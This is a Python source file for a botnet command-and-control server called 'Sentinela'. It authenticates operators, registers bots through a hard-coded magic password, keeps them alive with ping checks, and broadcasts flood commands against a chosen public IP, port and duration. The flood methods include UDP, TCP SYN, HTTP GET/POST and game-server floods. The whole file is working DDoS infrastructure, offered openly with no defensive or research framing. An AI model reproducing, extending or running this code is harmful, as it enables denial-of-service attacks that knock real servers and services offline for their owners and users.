import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

bots={}
clients={}
attacks={}
maxAttacks=30

ansi_clear = '\033[2J\033[H'

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLSYN": '\033[30m',
        "LIGHTBLSYN_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }
    return color_codes.get(data_input_output, "")

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")
yellow = color("LIGHTYELLOW_EX")
R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';G='\033[1;32m';Y='\033[1;33m';Q='\033[1;36m'

banner = f'''
                    {G}+ + + + + + + + + + + + + + + + + +
                    {G}+     {C}Sentinela by Cirqueira      {G}+
                    {Y}+    {C}Type 'Help' for commands     {Y}+
                    {Y}+ + + + + + + + + + + + + + + + + +
        '''

def botnetMethodsName(method):
    method_name = {
        ".UDP": '     UDP Flood',
        ".TCP": '     TCP Flood',
        ".SYN": '     TCP SYN Flood',
        ".HEX": '     HEX Flood',
        ".VSE": '     Send Valve Source Engine Protocol',
        ".MCPE": '    Minecraft PE Status Ping Protocol',
        ".FIVEM": '   Send FiveM Status Ping Protocol',
        ".ROBLOX": '  Roblox UDP Flood',
        ".HTTPGET": ' HTTP/1.1 GET Flood',
        ".HTTPPOST": 'HTTP/1.1 POST Flood',
        ".BROWSER": ' HTTP/1.1 BROWSER Simulator Flood'
    }
    if method == 'ALL':
        return method_name
    return method_name.get(method, "")
def isBotnetMethod(method):
    return botnetMethodsName(method) != ""

def removeAttacks(username, timeout):
    time.sleep(timeout)
    if username in attacks:
        del attacks[username]

def checkUser(username):
    if username in attacks:
        return False
    return True

def TargetIsAlreadySent(target, username):
    for username, info in attacks.items():
        if info['target'] == target:
            return False
    return True
  

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, name):
    titles = [
        'S', 'Se', 'Sen', 'Sent', 'Senti', 'Sentin', 'Sentine', 'Sentinel', 'Sentinela',
        'Sentinela', 'Sentinel', 'Sentine', 'Sentin', 'Senti', 'Sent', 'Sen', 'Se'
        ]
    while True:
        try:
            for title in titles:
                send(client, f"\33]0;{title} | Username: {name} | Users: {len(clients)} | Attacks: {len(attacks)}/{maxAttacks} | Bots: {len(bots)} \a", False)
                time.sleep(0.6)
        except Exception as e:
            print(f"An error occurred: {e}")
            client.close()
            break

def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.LIGHTBLUE_EX}Sentinela {Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP' or command == '?' or command == 'COMMANDS':
                send(client, f'{gray}Commands:           Description:')
                send(client, f'{C}HELP{gray}                Shows list of commands')
                send(client, f'{C}BOTNET{gray}              Shows list of botnet attack methods')
                send(client, f'{C}BOTS{gray}                Shows all conected bots')
                send(client, f'{C}CLEAR{gray}               Clears the screen')
                send(client, f'{C}LOGOUT{gray}              Disconnects from C&C server\n')

            elif command == 'BOTNET':
                botnetMethods = botnetMethodsName('ALL')
                send(client, f'{gray}Botnet Methods:')
                for m, desc in botnetMethods.items():
                    send(client, '\x1b[3;31;40m' + f"{C}{m}       {gray}{desc}")
                send(client, '')
            
            elif command == 'BOTS':
                send(client, f'{C}Connected bots: {G}{len(bots)}\n')

            elif command == 'OWNER' or command == 'CREDITS':
                send(client, f'\n{B}Instagram{gray}: {Q}cirqueirakkjk')
                send(client, f'{B}Telegram{gray}: {Q}CirqueiraDev')
                send(client, f'{B}Discord{gray}: {Q}cirqueira')
                send(client, f'{B}GitHub{gray}: {Q}CirqueiraDev\n')

            elif command == 'CLEAR' or command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT' or command == 'QUIT' or command == 'EXIT':
                send(client, f'\n{B}America ya!\n')
                time.sleep(1)
                break
            
            # send Botnet attack
            elif isBotnetMethod(command):
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if len(attacks) < maxAttacks:
                                    if checkUser(username):
                                        if TargetIsAlreadySent(ip, username):
                                            attackSend = f'''
{gray}> {lightwhite}Method   {gray}: {yellow}{botnetMethodsName(command).strip()}{gray}
{gray}> {lightwhite}Target   {gray}: {lightwhite}{ip}{gray}
{gray}> {lightwhite}Port     {gray}: {lightwhite}{port}{gray}
{gray}> {lightwhite}Duration {gray}: {lightwhite}{secs}{gray}'''
                                            
                                            for x in attackSend.split('\n'):
                                                send(client, '\x1b[3;31;40m'+ x)
                                                
                                            send(client, f'{G} Attack sent to {len(bots)} {"bots\n" if len(bots) > 1 else "bot"}\n')
                                            attacks.update({username: {'target': ip, 'duration': secs}})
                                            threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
                                            broadcast(data)
                                        else:
                                            send(client, Fore.RED + "Target is already under flood, don't abuse it!\n")
                                    else:
                                        send(client, Fore.RED + "Attack already sent!\n")
                                else:
                                    send(client, Fore.RED + 'No slots available!\n')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)\n')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)\n')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address\n')
                else:
                    send(client, f'Usage: {gray}{command} [IP] [PORT] [TIME]\n')

            send(client, prompt, False)
        except Exception as e:
            print(f'error: {e}')
            break
    client.close()
    if client in clients:
        del clients[client]

def handle_client(client, address):
    send(client, f'\33]0;Sentinela | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        clients.update({client: address})
        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client, username]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <C2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
